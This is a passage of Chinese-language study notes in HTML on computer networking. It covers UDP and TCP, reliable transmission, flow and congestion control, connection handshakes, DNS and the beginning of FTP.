UDP。</li><li>运输层向高层用户屏蔽了下面网络核心的细节（如网络拓扑、所采用的路由选择协议等），它使应用进程看见的就是好像在两个运输层实体之间有一条端到端的逻辑通信信道。</li><li>当运输层采用面向连接的 TCP 协议时，尽管下面的网络是不可靠的（只提供尽最大努力服务），但这种逻辑通信信道就相当于一条全双工的可靠信道。</li><li>当运输层采用无连接的 UDP 协议时，这种逻辑通信信道是一条不可靠信道。</li></ul><h3 id="5-1-2-运输层的两个主要协议"><a href="#5-1-2-运输层的两个主要协议" class="headerlink" title="5.1.2 运输层的两个主要协议"></a>5.1.2 运输层的两个主要协议</h3><ul><li>TCP/IP 的运输层有两个主要协议：<ul><li>（1）用户数据报协议 UDP (User Datagram Protocol)</li><li>（2）传输控制协议 TCP (Transmission Control Protocol)</li></ul></li><li>两个对等运输实体在通信时传送的数据单位叫作运输协议数据单元 TPDU</li><li>TCP 传送的数据单位协议是 TCP 报文段</li><li>UDP 传送的数据单位协议是 UDP 报文或用户数据报。</li><li>UDP：传输前不需要建立连接，不可靠</li><li>TCP：传输数据前建立连接，传输后释放，其下网络是不可靠的，但是 TCP 提供可靠的面向连接的运输服务，TCP 不提供广播，多播服务</li></ul><h3 id="5-1-3-运输层的端口"><a href="#5-1-3-运输层的端口" class="headerlink" title="5.1.3 运输层的端口"></a>5.1.3 运输层的端口</h3><ul><li>复用：应用层所有的应用进程都可以通过运输层再传送到 IP 层</li><li>分用：运输层从 IP 层收到发送给个应用进程的数据后，必须分别交付指明的各应用进程</li><li>运行在计算机中的进程是用进程标识符来标志的。</li><li>但运行在应用层的各种应用进程却不应当让计算机操作系统指派它的进程标识符。这是因为在互联网上使用的计算机的操作系统种类很多，而不同的操作系统又使用不同格式的进程标识符。</li><li>为了使运行不同操作系统的计算机的应用进程能够互相通信，就必须用统一的方法对 TCP/IP 体系的应用进程进行标志。 即使用协议端口号</li><li>在协议栈层间的抽象的协议端口是软件端口。路由器或交换机上的端口是硬件端口。</li><li>端口号只具有本地意义，即端口号只是为了标志本计算机应用层中的各进程</li><li>由此可见，两个计算机中的进程要互相通信，不仅必须知道对方的 IP 地址（为了找到对方的计算机），而且还要知道对方的端口号（为了找到对方计算机中的应用进程）。</li></ul><h2 id="5-2-用户数据报协议-UDP"><a href="#5-2-用户数据报协议-UDP" class="headerlink" title="5.2 用户数据报协议 UDP"></a>5.2 用户数据报协议 UDP</h2><h3 id="5-2-1-UDP-概述"><a href="#5-2-1-UDP-概述" class="headerlink" title="5.2.1 UDP 概述"></a>5.2.1 UDP 概述</h3><ul><li>UDP 具有复用，分用，差错检验的功能</li><li>UDP 的特点：<ul><li>（1）UDP 是无连接的，发送数据之前不需要建立连接，因此减少了开销和发送数据之前的时延。</li><li>（2）UDP 使用尽最大努力交付，即不保证可靠交付，因此主机不需要维持复杂的连接状态表。</li><li>（3）UDP 是面向报文的。UDP 对应用层交下来的报文，既不合并，也不拆分，而是保留这些报文的边界。UDP 一次交付一个完整的报文。</li><li>（4）UDP 没有拥塞控制，因此网络出现的拥塞不会使源主机的发送速率降低。这对某些实时应用是很重要的。很适合多媒体通信的要求。 选择合适大小的报文</li><li>（5）UDP 支持一对一、一对多、多对一和多对多的交互通信</li><li>（6）UDP 的首部开销小，只有 8 个字节，比 TCP 的 20 个字节的首部要短。</li></ul></li></ul><h3 id="5-2-2-UDP-的首部格式"><a href="#5-2-2-UDP-的首部格式" class="headerlink" title="5.2.2 UDP 的首部格式"></a>5.2.2 UDP 的首部格式</h3><ul><li>首部字段很简单，只有 8 个字节（4 个字段，每个字段 2 个字节）：<ul><li>（1）源端口</li><li>（2）目的端口</li><li>（3）长度</li><li>（4）检验和</li></ul></li><li>计算检验和时，再 UDP 用户数据报之前增加 12 个字节的伪首部（仅用于计算检验和）</li><li>IP 数据报的检验和只检验 IP 数据报的首部，而 UDP 的检验和是把首部和数据部分一起都检验</li></ul><h2 id="5-3-传输控制协议-TCP-概述"><a href="#5-3-传输控制协议-TCP-概述" class="headerlink" title="5.3 传输控制协议 TCP 概述"></a>5.3 传输控制协议 TCP 概述</h2><h3 id="5-3-1-TCP-最主要的特点"><a href="#5-3-1-TCP-最主要的特点" class="headerlink" title="5.3.1 TCP 最主要的特点"></a>5.3.1 TCP 最主要的特点</h3><ul><li>（1）TCP 是面向连接的运输层协议。</li><li>（2）每一条 TCP 连接只能有两个端点，每一条 TCP 连接只能是点对点的（一对一）。</li><li>（3）TCP 提供可靠交付的服务。</li><li>（4）TCP 提供全双工通信。</li><li>（5）面向字节流</li></ul><h3 id="5-3-2-TCP-的连接"><a href="#5-3-2-TCP-的连接" class="headerlink" title="5.3.2 TCP 的连接"></a>5.3.2 TCP 的连接</h3><ul><li>TCP 把连接作为最基本的抽象。</li><li>每一条 TCP 连接有两个端点。</li><li>TCP 连接的端点不是主机，不是主机的 IP 地址，不是应用进程，也不是运输层的协议端口。</li><li>TCP 连接的端点叫做套接字 (socket) 或插口。</li><li>端口号拼接到 (contatenated with) IP 地址即构成了套接字。</li><li>套接字 socket = （IP 地址：端口）</li><li>每一条 TCP 连接唯一地被通信两端的两个端点（两个套接字）所确定。</li><li>TCP 连接 ::= {socket1, socket2} = {(IP1: port1)，(IP2: port2)}</li><li>TCP 连接的端点是个很抽象的套接字，即（IP 地址：端口）。</li><li>同一个 IP 地址可以有多个不同的 TCP 连接。</li><li>同一个端口号也可以出现在多个不同的 TCP 连接中。</li></ul><h2 id="可靠传输的工作原理"><a href="#可靠传输的工作原理" class="headerlink" title="可靠传输的工作原理"></a>可靠传输的工作原理</h2><ul><li>理想的传输条件有以下两个特点：<ul><li>（1）传输信道不产生差错。</li><li>（2）不管发送方以多快的速度发送数据，接收方总是来得及处理收到的数据。</li></ul></li><li>然而实际的网络都不具备以上两个理想条件。必须使用一些可靠传输协议，在不可靠的传输信道实现可靠传输。</li></ul><h3 id="5-4-1-停止等待协议"><a href="#5-4-1-停止等待协议" class="headerlink" title="5.4.1 停止等待协议"></a>5.4.1 停止等待协议</h3><ul><li>停止等待：每发送完一个分组就通知发送，等待对方的确认。在收到确认后再发送下一个分组</li><li>无差错情况</li><li>出现差错<ul><li>在接收方 B 会出现两种情况：<ul><li>B 接收 M1 时检测出了差错，就丢弃 M1，其他什么也不做（不通知 A 收到有差错的分组）。</li><li>M1 在传输过程中丢失了，这时 B 当然什么都不知道，也什么都不做。</li></ul></li><li>在这两种情况下，B 都不会发送任何信息。</li><li>如何保证 B 正确收到了 M1 呢？</li><li>解决方法：超时重传<ul><li>A 为每一个已发送的分组都设置了一个超时计时器。</li><li>A 只要在超时计时器到期之前收到了相应的确认，就撤销该超时计时器，继续发送下一个分组 M2 。</li></ul></li><li>A 需要暂时保留已发送的分组的副本，且必须有编号，并且超时计时器设置的重传时间应当比数据在分组传输的平均往返时间更长</li></ul></li></ul><h3 id="5-4-2-连续-ARQ-协议"><a href="#5-4-2-连续-ARQ-协议" class="headerlink" title="5.4.2 连续 ARQ 协议"></a>5.4.2 连续 ARQ 协议</h3><ul><li>滑动窗口协议比较复杂，是 TCP 协议的精髓所在。</li><li>发送方维持的发送窗口，它的意义是：位于发送窗口内的分组都可连续发送出去，而不需要等待对方的确认。这样，信道利用率就提高了。</li><li>连续 ARQ 协议规定，发送方每收到一个确认，就把发送窗口向前滑动一个分组的位置。</li><li>接收方一般采用累积确认的方式。即不必对收到的分组逐个发送确认，而是对按序到达的最后一个分组发送确认，这样就表示：到这个分组为止的所有分组都已正确收到了。</li><li>优点：容易实现，即使确认丢失也不必重传。</li><li>缺点：不能向发送方反映出接收方已经正确收到的所有分组的信息。</li><li>如果发送方发送了前 5 个分组，而中间的第 3 个分组丢失了。这时接收方只能对前两个分组发出确认。发送方无法知道后面三个分组的下落，而只好把后面的三个分组都再重传一次。这就叫做 Go-back-N （回退 N），表示需要再退回来重传已发送过的 N 个分组。</li></ul><h2 id="5-5-TCP-报文段的首部格式"><a href="#5-5-TCP-报文段的首部格式" class="headerlink" title="5.5 TCP 报文段的首部格式"></a>5.5 TCP 报文段的首部格式</h2><ul><li>TCP 虽然是面向字节流的，但 TCP 传送的数据单元却是报文段。</li><li>一个 TCP 报文段分为首部和数据两部分，而 TCP 的全部功能都体现在它首部中各字段的作用。</li><li>TCP 报文段首部的前 20 个字节是固定的，后面有 4n 字节是根据需要而增加的选项 (n 是整数)。因此 TCP 首部的最小长度是 20 字节。</li><li>首部固定部分各字段的意义：<ul><li>（1）源端口和目的端口</li><li>（2）序号：报文段序号，每一个字节按顺序编号</li><li>（3）确认号：期望收到对方下一个报文段的第一个数据字节的序号</li><li>（4）数据偏移：</li><li>（5）保留：</li><li>（6）紧急 URG：为 1 时，表示紧急</li><li>（7）确认 ACK：为 1 确认号字段有效</li><li>（8）推送 PSH：</li><li>（9）复位 RST</li><li>（10）同步 SYN</li><li>（11）终止 FIN</li><li>（12）窗口：窗口值作为接收方让发送方设置器发送窗口的依据</li><li>（13）检验和</li><li>（14）紧急指针</li><li>（15）选项：<ul><li>①最大报文段长度 MSS，每一个 TCP 报文段中的数据字段的最大长度</li><li>②窗口扩大选项③时间戳选项④选择确认选项</li></ul></li></ul></li></ul><h2 id="5-6-TCP-可靠传输的实现"><a href="#5-6-TCP-可靠传输的实现" class="headerlink" title="5.6 TCP 可靠传输的实现"></a>5.6 TCP 可靠传输的实现</h2><h3 id="5-6-1-TCP-以字节为单位的滑动窗口"><a href="#5-6-1-TCP-以字节为单位的滑动窗口" class="headerlink" title="5.6.1 TCP 以字节为单位的滑动窗口"></a>5.6.1 TCP 以字节为单位的滑动窗口</h3><ul><li>根据 B 给出的窗口值，A 构造出自己的发送窗口。</li><li>发送窗口表示：在没有收到 B 的确认的情况下，A 可以连续把窗口内的数据都发送出去。</li><li>发送窗口里面的序号表示允许发送的序号。</li><li>显然，窗口越大，发送方就可以在收到对方确认之前连续发送更多的数据，因而可能获得更高的传输效率。</li><li>描述发送窗口的状态：需要三个指针，p1，p2，p3，指针都指向序号</li><li>收到确认后，发送窗口向前滑动</li><li>A 的发送窗口内的序号都已用完，但还没有再收到确认，必须停止发送。</li><li>发送窗口中的序号全是发送未确认的或未发送的</li><li>发送窗口只是发送缓存中的一部分</li><li>发送缓存用来暂时存放：<ul><li>发送应用程序传送给发送方 TCP 准备发送的数据；</li><li>TCP 已发送出但尚未收到确认的数据。</li></ul></li><li>接收缓存用来暂时存放：<ul><li>按序到达的、但尚未被接收应用程序读取的数据；</li><li>不按序到达的数据。</li></ul></li><li>注意：<ul><li>（1）第一，A 的发送窗口并不总是和 B 的接收窗口一样大（因为有一定的时间滞后）。</li><li>（2）第二，TCP 标准没有规定对不按序到达的数据应如何处理。通常是先临时存放在接收窗口中，等到字节流中所缺少的字节收到后，再按序交付上层的应用进程。</li><li>（3）第三，TCP 要求接收方必须有累积确认的功能，这样可以减小传输开销。</li></ul></li><li>TCP 是全双工通信，每一方都有自己的发送窗口和接受窗口</li></ul><h3 id="5-6-2-超时重传时间的选择"><a href="#5-6-2-超时重传时间的选择" class="headerlink" title="5.6.2 超时重传时间的选择"></a>5.6.2 超时重传时间的选择</h3><ul><li>超时重传机制是 TCP 中最重要和最复杂的问题之一。TCP 每发送一个报文段，就对这个报文段设置一次计时器。只要计时器设置的重传时间到但还没有收到确认，就要重传这一报文段。重传时间的选择是 TCP 最复杂的问题之一。</li><li>TCP 采用了一种自适应算法，它记录一个报文段发出的时间，以及收到相应的确认的时间。这两个时间之差就是报文段的往返时间 RTT。</li><li>TCP 保留了 RTT 的一个加权平均往返时间 RTTS（这又称为平滑的往返时间）。</li><li>第一次测量到 RTT 样本时，RTTS 值就取为所测量到的 RTT 样本值。以后每测量到一个新的 RTT 样本，就按下式重新计算一次 RTTS：</li><li>超时重传时间 RTO (Retransmission Time-Out) 应略大于上面得出的加权平均往返时间 RTTS。RFC 2988 建议使用下式计算 RTO：</li><li>RTTD 是 RTT 的偏差的加权平均值。</li><li>RFC 2988 建议这样计算 RTTD。第一次测量时，RTTD 值取为测量到的 RTT 样本值的一半。在以后的测量中，则使用下式计算加权平均的 RTTD：<ul><li>β 是个小于 1 的系数，其推荐值是 1/4，即 0.25。</li></ul></li><li>Karn 算法：在计算平均往返时间 RTT 时，只要报文段重传了，就不采用其往返时间样本，但是这又引起新的问题。当报文段的时延突然增大了很多时，在原来得出的重传时间内，不会收到确认报文段。于是就重传报文段。但根据 Karn 算法，不考虑重传的报文段的往返时间样本。这样，超时重传时间就无法更新报文段</li><li>修正后的 Karn 算法：报文段每重传一次，就把超时重传的时间 RTO 增大一点。典型的做法是取新的重传时间为原来的重传时间的 2 倍，当不再发生报文段的重传时，才根据报文段的往返时延更新平均往返时延 RTT 和超时重传时间 RTO 的数值。</li></ul><h3 id="5-6-3-选择确认-SACK"><a href="#5-6-3-选择确认-SACK" class="headerlink" title="5.6.3 选择确认 SACK"></a>5.6.3 选择确认 SACK</h3><ul><li>接收方收到了和前面的字节流不连续的两个字节块。如果这些字节的序号都在接收窗口之内，那么接收方就先收下这些数据，但要把这些信息准确地告诉发送方，使发送方不要再重复发送这些已收到的数据。</li></ul><h2 id="5-7-TCP-流量控制"><a href="#5-7-TCP-流量控制" class="headerlink" title="5.7 TCP 流量控制"></a>5.7 TCP 流量控制</h2><h3 id="5-7-1-利用滑动窗口实现流量控制"><a href="#5-7-1-利用滑动窗口实现流量控制" class="headerlink" title="5.7.1 利用滑动窗口实现流量控制"></a>5.7.1 利用滑动窗口实现流量控制</h3><ul><li>流量控制：让发送方的发送速率不要太快，要让接收方来得及接收</li><li>可能出现死锁：B 向 A 发送了零窗口的报文段后不久，B 的接收缓存又有了一些存储空间。于是 B 向 A 发送了 rwnd = 400 的报文段。但这个报文段在传送过程中丢失了。A 一直等待收到 B 发送的非零窗口的通知，而 B 也一直等待 A 发送的数据。如果没有其他措施，这种互相等待的死锁局面将一直延续下去。</li><li>为了解决这个问题，TCP 为每一个连接设有一个持续计时器 (persistence timer)。只要 TCP 连接的一方收到对方的零窗口通知，就启动该持续计时器。若持续计时器设置的时间到期，就发送一个零窗口探测报文段（仅携带 1 字节的数据），而对方就在确认这个探测报文段时给出了现在的窗口值。<ul><li>若窗口仍然是零，则收到这个报文段的一方就重新设置持续计时器。</li><li>若窗口不是零，则死锁的僵局就可以打破了。</li></ul></li></ul><h3 id="5-7-2-TCP-的传输效率"><a href="#5-7-2-TCP-的传输效率" class="headerlink" title="5.7.2 TCP 的传输效率"></a>5.7.2 TCP 的传输效率</h3><ul><li>控制 TCP 报文段的发送时机:<ul><li>（1）第一种机制是 TCP 维持一个变量，它等于最大报文段长度 MSS。只要缓存中存放的数据达到 MSS 字节时，就组装成一个 TCP 报文段发送出去。</li><li>（2）第二种机制是由发送方的应用进程指明要求发送报文段，即 TCP 支持的推送 (push) 操作。</li><li>（3）第三种机制是发送方的一个计时器期限到了，这时就把当前已有的缓存数据装入报文段（但长度不能超过 MSS）发送出去。</li></ul></li><li>Nagle 算法：<ul><li>若发送应用进程把要发送的数据逐个字节地送到 TCP 的发送缓存，则发送方就把第一个数据字节先发送出去，把后面到达的数据字节都缓存起来。</li><li>当发送方收到对第一个数据字符的确认后，再把发送缓存中的所有数据组装成一个报文段发送出去，同时继续对随后到达的数据进行缓存。</li><li>只有在收到对前一个报文段的确认后才继续发送下一个报文段。</li><li>当到达的数据已达到发送窗口大小的一半或已达到报文段的最大长度时，就立即发送一个报文段。</li></ul></li><li>糊涂窗口综合征：接收方缓存已满，应用程序一次只读取一个，导致发送方每次只发送一个字节数据，效率降低<ul><li>解决方法：让接收方等待一段时间，使得接收缓存已有足够空间容纳一个最长的报文段，或等待接收缓存已有一半空闲空间，只要出现这两种情况之一，接收方就发出确认报文，并向发送方通知当前的窗口大小</li></ul></li></ul><h2 id="5-8-TCP-的拥塞控制"><a href="#5-8-TCP-的拥塞控制" class="headerlink" title="5.8 TCP 的拥塞控制"></a>5.8 TCP 的拥塞控制</h2><h3 id="5-8-1-拥塞控制的一般原理"><a href="#5-8-1-拥塞控制的一般原理" class="headerlink" title="5.8.1 拥塞控制的一般原理"></a>5.8.1 拥塞控制的一般原理</h3><ul><li>拥塞：在某段时间，若对网络中某一资源的需求超过了该资源所提供的可用部分，网络性能变坏的情况</li><li>问题的实质是整个系统的各个部分（速率，缓存大小等）不匹配</li><li>拥塞控制：防止过多的数据注入到网络中，这样可以使网络中的路由器或链路不致过载</li><li>拥塞控制的前提：网络能够承受现有的网络负荷，这是一个全局性的过程</li><li>区分流量控制和拥塞控制：流量控制往往是指点对点通信量的控制，是端到端的问题</li><li>实践证明，拥塞控制是很难设计的，因为它是一个动态的（而不是静态的）问题。</li><li>当前网络正朝着高速化的方向发展，这很容易出现缓存不够大而造成分组的丢失。但分组的丢失是网络发生拥塞的征兆而不是原因。</li><li>在许多情况下，甚至正是拥塞控制本身成为引起网络性能恶化甚至发生死锁的原因。这点应特别引起重视。</li><li>分类：<ul><li>开环控制方法就是在设计网络时事先将有关发生拥塞的因素考虑周到，力求网络在工作时不产生拥塞。</li><li>闭环控制方法是基于反馈环路的概念。属于闭环控制的有以下几种措施：<ul><li>（1）监测网络系统以便检测到拥塞在何时、何处发生。</li><li>（2）将拥塞发生的信息传送到可采取行动的地方。</li><li>（3）调整网络系统的运行以解决出现的问题。</li></ul></li></ul></li></ul><h3 id="5-8-2-TCP-的拥塞控制方法"><a href="#5-8-2-TCP-的拥塞控制方法" class="headerlink" title="5.8.2 TCP 的拥塞控制方法"></a>5.8.2 TCP 的拥塞控制方法</h3><ul><li>TCP 采用基于窗口的方法进行拥塞控制。该方法属于闭环控制方法。</li><li>TCP 发送方维持一个拥塞窗口 CWND (Congestion Window) 拥塞窗口的大小取决于网络的拥塞程度，并且动态地在变化。</li><li>发送端利用拥塞窗口根据网络的拥塞情况调整发送的数据量。</li><li>所以，发送窗口大小不仅取决于接收方公告的接收窗口，还取决于网络的拥塞状况</li><li>判断网络拥塞的依据是出现超时</li><li>TCP 进行拥塞控制的算法：慢开始，拥塞避免，快重传，快恢复</li></ul><h4 id="慢开始和拥塞避免"><a href="#慢开始和拥塞避免" class="headerlink" title="慢开始和拥塞避免"></a>慢开始和拥塞避免</h4><ul><li>慢开始算法：当主机开始发送数据时，由于并不清楚网络的负荷情况，所以如果立即把大量数据字节注入到网络，那么就有可能引起网络发生拥塞，经验证明，较好的方法是先探测以下，即由小到大逐渐增大发送窗口，也就是说，由小到大逐渐增大拥塞窗口数值</li><li>慢开始规定，在每收到一个新的报文段的确认后，可以把拥塞窗口增加最多一个 SMSS（发送方的最大报文段）的数值。<ul><li>拥塞窗口每次的增加量：min（N，SMSS）</li></ul></li><li>使用慢开始算法后，每经过一个传输轮次 (transmission round)，拥塞窗口 cwnd 就加倍。</li><li>一个传输轮次所经历的时间其实就是往返时间 RTT。</li><li>“传输轮次”更加强调：把拥塞窗口 cwnd 所允许发送的报文段都连续发送出去，并收到了对已发送的最后一个字节的确认。</li><li>例如，拥塞窗口 cwnd = 4，这时的往返时间 RTT 就是发送方连续发送 4 个报文段，并收到这 4 个报文段的确认，总共经历的时间。</li><li>慢开始门限 ssthresh 的用法如下：<ul><li>当 cwnd &lt; ssthresh 时，使用慢开始算法。</li><li>当 cwnd &gt; ssthresh 时，停止使用慢开始算法而改用拥塞避免算法。</li><li>当 cwnd = ssthresh 时，既可使用慢开始算法，也可使用拥塞避免算法。</li></ul></li><li>拥塞避免算法：让拥塞窗口 cwnd 缓慢地增大，即每经过一个往返时间 RTT 就把发送方的拥塞窗口 cwnd 加 1，而不是加倍，使拥塞窗口 cwnd 按线性规律缓慢增长，比慢开始算法的拥塞窗口增长速率缓慢得多。</li><li>因此在拥塞避免阶段就有“加法增大” (Additive Increase) 的特点。这表明在拥塞避免阶段，拥塞窗口 cwnd 按线性规律缓慢增长，比慢开始算法的拥塞窗口增长速率缓慢得多。</li></ul><h4 id="快重传算法："><a href="#快重传算法：" class="headerlink" title="快重传算法："></a>快重传算法：</h4><ul><li>采用快重传 FR (Fast Retransmission) 算法可以让发送方尽早知道发生了个别报文段的丢失。</li><li>快重传 算法首先要求接收方不要等待自己发送数据时才进行捎带确认，而是要立即发送确认，即使收到了失序的报文段也要立即发出对已收到的报文段的重复确认</li><li>发送方只要一连收到三个重复确认，就知道接收方确实没有收到报文段，因而应当立即进行重传（即“快重传”），这样就不会出现超时，发送方也不就会误认为出现了网络拥塞。</li><li>使用快重传可以使整个网络的吞吐量提高约 20%。</li><li>不难看出，快重传并非取消重传计时器，而是在某些情况下可更早地重传丢失的报文段。</li></ul><h4 id="快恢复算法"><a href="#快恢复算法" class="headerlink" title="快恢复算法"></a>快恢复算法</h4><h3 id="5-8-3-主动队列管理"><a href="#5-8-3-主动队列管理" class="headerlink" title="5.8.3 主动队列管理"></a>5.8.3 主动队列管理</h3><h2 id="5-9-TCP-的运输连接管理"><a href="#5-9-TCP-的运输连接管理" class="headerlink" title="5.9 TCP 的运输连接管理"></a>5.9 TCP 的运输连接管理</h2><h3 id="5-9-1-TCP-的连接建立"><a href="#5-9-1-TCP-的连接建立" class="headerlink" title="5.9.1 TCP 的连接建立"></a>5.9.1 TCP 的连接建立</h3><ul><li>TCP 建立连接的过程叫做握手</li><li>握手需要在客户和服务器之间交换三个 TCP 报文段。称之为三报文握手。</li><li>采用三报文握手主要是为了防止已失效的连接请求报文段突然又传送到了，因而产生错误。</li><li>一开始 B 的 TCP 服务器进程先创建传输控制块 TCB，A 的 TCP 客户进程也是首先创建传输控制模块 TCB</li><li>A 的 TCP 向 B 发出连接请求报文段，其首部中的同步位 SYN = 1，并选择序号 seq = x，表明传送数据时的第一个数据字节的序号是 x。TCP 规定 SYN 报文段不能携带数据，但要消耗一个序号</li><li>B 的 TCP 收到连接请求报文段后，如同意，则发回确认。B 在确认报文段中应使 SYN = 1，使 ACK = 1，其确认号 ack = x + 1，自己选择的序号 seq = y。</li><li>A 收到此报文段后向 B 给出确认，其 ACK = 1，确认号 ack = y + 1。A 的 TCP 通知上层应用进程，连接已经建立。 B 的 TCP 收到主机 A 的确认后，也通知其上层应用进程：TCP 连接已经建立。</li></ul><h3 id="5-9-2-TCP-的连接释放"><a href="#5-9-2-TCP-的连接释放" class="headerlink" title="5.9.2 TCP 的连接释放"></a>5.9.2 TCP 的连接释放</h3><ul><li>数据传输结束后，通信的双方都可释放连接。</li><li>TCP 连接释放过程是四报文握手。</li><li>连接释放报文段首部的终止控制位 FIN</li><li>数据传输结束后，通信的双方都可释放连接。</li><li>现在 A 的应用进程先向其 TCP 发出连接释放报文段，并停止再发送数据，主动关闭 TCP 连接。</li><li>A 把连接释放报文段首部的 FIN = 1，其序号 seq = u，等待 B 的确认。</li><li>B 发出确认，确认号 ack = u + 1，而这个报文段自己的序号 seq = v。</li><li>TCP 服务器进程通知高层应用进程。</li><li>从 A 到 B 这个方向的连接就释放了，TCP 连接处于半关闭状态。B 若发送数据，A 仍要接收。</li><li>若 B 已经没有要向 A 发送的数据，其应用进程就通知 TCP 释放连接。</li><li>A 收到连接释放报文段后，必须发出确认。在确认报文段中 ACK = 1，确认号 ack = w + 1，自己的序号 seq = u + 1，然后进入 TIME-WAIT 状态。</li><li>为什么 A 在 TIME-WAIT 状态必须等待 2MSL：<ul><li>（1）第一，为了保证 A 发送的最后一个 ACK 报文段能够到达 B。</li><li>（2）第二，防止 “已失效的连接请求报文段” 出现在本连接中。A 在发送完最后一个 ACK 报文段后，再经过时间 2MSL，就可以使本连接持续的时间内所产生的所有报文段，都从网络中消失。这样就可以使下一个新的连接中不会出现这种旧的连接请求报文段。</li></ul></li></ul><h1 id="第六章-应用层"><a href="#第六章-应用层" class="headerlink" title="第六章 应用层"></a>第六章 应用层</h1><ul><li>应用层协议是为了解决某一类应用问题，而问题的解决往往是通过位于不同主机中的多个应用进程之间的通信和协同工作来完成的。</li><li>应用层的具体内容就是规定应用进程在通信时所遵循的协议</li><li>应用层的许多协议都是基于 C/S 模式，客户和服务器都是通信中所涉及的两个应用进程</li></ul><h2 id="6-1-域名系统-DNS"><a href="#6-1-域名系统-DNS" class="headerlink" title="6.1 域名系统 DNS"></a>6.1 域名系统 DNS</h2><h3 id="6-1-1-域名系统概述"><a href="#6-1-1-域名系统概述" class="headerlink" title="6.1.1 域名系统概述"></a>6.1.1 域名系统概述</h3><ul><li>许多应用层软件经常直接使用域名系统 DNS (Domain Name System)，但计算机的用户只是间接而不是直接使用域名系统。</li><li>互联网采用层次结构的命名树作为主机的名字，并使用分布式的域名系统 DNS。</li><li>名字到 IP 地址的解析是由若干个域名服务器程序完成的。域名服务器程序在专设的结点上运行，运行该程序的机器称为域名服务器。</li></ul><h4 id="互联网采用了层次树状结构的命名方法。"><a href="#互联网采用了层次树状结构的命名方法。" class="headerlink" title="互联网采用了层次树状结构的命名方法。"></a>互联网采用了层次树状结构的命名方法。</h4><ul><li>任何一个连接在互联网上的主机或路由器，都有一个唯一 的层次结构的名字，即域名。</li><li>域名的结构由标号序列组成，各标号之间用点隔开：… . 三级域名 . 二级域名 . 顶级域名</li><li>各标号分别代表不同级别的域名。</li><li>域名只是个逻辑概念，并不代表计算机所在的物理地点。</li><li>变长的域名和使用有助记忆的字符串，是为了便于人来使用</li><li>每一个域名中“点”的数目则不一定正好是三个</li></ul><h4 id="顶级域名："><a href="#顶级域名：" class="headerlink" title="顶级域名："></a>顶级域名：</h4><ul><li>（1）国家顶级域名 nTLD<ul><li>.cn 表示中国</li><li>.us 表示美国</li><li>.uk 表示英国</li><li>等等</li></ul></li><li>（2）通用顶级域名 gTLD<ul><li>最早的顶级域名<ul><li>.com 公司和企业</li><li>.net 网络服务机构</li><li>.org 非盈利性组织</li><li>.edu 美国专用教育机构</li><li>.gov 美国专用政府部门</li><li>.mil 美国专用军事部门</li><li>.int 国际组织</li></ul></li><li>新增通用顶级域名<ul><li>.aero</li><li>.biz</li><li>.cat</li><li>.name</li><li>等等</li></ul></li></ul></li><li>（3）基础结构域名<ul><li>这种顶级域名只有一个，即 arpa 用于反响域名解析，因此又称为反向域名</li></ul></li></ul><h3 id="6-1-3-域名服务器"><a href="#6-1-3-域名服务器" class="headerlink" title="6.1.3 域名服务器"></a>6.1.3 域名服务器</h3><ul><li>一个服务器所管辖的范围叫做区</li><li>各单位根据具体情况来划分自己管辖范围的区。但在一个区中的所有节点必须是能够连通的。</li><li>每一个区设置相应的权限域名服务器，用来保存该区中的所有主机的域名到 IP 地址的映射。</li><li>DNS 服务器的管辖范围不是以“域”为单位，而是以“区”为单位。</li><li>域名服务器有以下四种类型：<ul><li>根域名服务器<ul><li>最高层次的域名服务器，也是最重要的域名服务器。所有的根域名服务器都知道所有的顶级域名服务器的域名和 IP 地址。</li><li>不管是哪一个本地域名服务器，若要对互联网上任何一个域名进行解析，只要自己无法解析，就首先求助于根域名服务器。</li><li>根域名服务器并不直接把域名直接转换成 IP 地址。</li><li>在使用迭代查询时，根域名服务器把下一步应当找的顶级域名服务器的 IP 地址告诉本地域名服务器。</li><li>根域名服务器共有 13 套装置，不是 13 个机器（a~m）</li></ul></li><li>顶级域名服务器<ul><li>顶级域名服务器（即 TLD 服务器）负责管理在该顶级域名注册的所有二级域名。</li></ul></li><li>权限域名服务器<ul><li>负责一个区的域名服务器</li></ul></li><li>本地域名服务器<ul><li>当一个主机发出 DNS 查询请求时，这个查询请求报文就发送给本地域名服务器</li><li>这种域名服务器有时也称为默认域名服务器；</li></ul></li></ul></li><li>提高域名服务器的可靠性：<ul><li>DNS 域名服务器都把数据复制到几个域名服务器来保存，其中的一个是主域名服务器，其他的是辅助域名服务器。</li><li>当主域名服务器出故障时，辅助域名服务器可以保证 DNS 的查询工作不会中断。</li><li>主域名服务器定期把数据复制到辅助域名服务器中，而更改数据只能在主域名服务器中进行。这样就保证了数据的一致性。</li></ul></li><li>域名解析过程：<ul><li>主机向本地域名服务器的查询一般都是采用递归查询。如果主机所询问的本地域名服务器不知道被查询域名的 IP 地址，那么本地域名服务器就以 DNS 客户的身份，向其他根域名服务器继续发出查询请求报文。</li><li>本地域名服务器向根域名服务器的查询通常是采用迭代查询。当根域名服务器收到本地域名服务器的迭代查询请求报文时，要么给出所要查询的 IP 地址，要么告诉本地域名服务器：“你下一步应当向哪一个域名服务器进行查询”。然后让本地域名服务器进行后续的查询。</li></ul></li><li>每个域名服务器都维护一个高速缓存，存放最近用过的名字以及从何处获得名字映射信息的记录</li></ul><h2 id="6-2-文件传送协议"><a href="#6-2-文件传送协议" class="headerlink" title="6.2 文件传送协议"></a>6.2 文件传送协议</h2><h3 id="6-2-1-FTP-概述"><a href="#6-2-1-FTP-概述" class="headerlink" title="6.2.1 FTP 概述"></a>6.2.1 FTP 概述</h3><ul><li>文件传送协议 FTP (File Transfer Protocol) 是互联网上使用得最广泛的文件传送协议。</li><li>FTP 提供交互式的访问，允许客户指明文件的类型与格式，并允许文件具有存取权限。</li><li>FTP 屏蔽了各计算机系统的细节，因而适合于在异构网络中任意计算机之间传送文件。</li><li>文件传送非常困难。原因是众多的计算机厂商研制出的文件系统多达数百种，且差别很大</li></ul><h3 id="6-2-2-FTP-的基本工作原理"><a href="#6-2-2-FTP-的基本工作原理" class="headerlink" title="6.2.2 FTP 的基本工作原理"></a>6.2.2 FTP 的基本工作原理</h3><ul><li>网络环境下复制文件的复杂性：<ul><li>（1）计算机存储数据的格式不同。</li><li>（2）文件的目录结构和文件命名的规定不同。</li><li>（3）对于相同的文件存取功能，操作系统使用的命令不同。</li><li>（4）访问控制方法不同。</li></ul></li><li>FTP 的特点：<ul><li>（1）只提供文件传送的一些基本的服务</li><li>（2）使用 TCP 可靠的运输服务</li><li>（3）减少消除在不同操作系统下处理文件的不兼容性</li><li>（4）FTP 使用 C/S 模式。一个 FTP 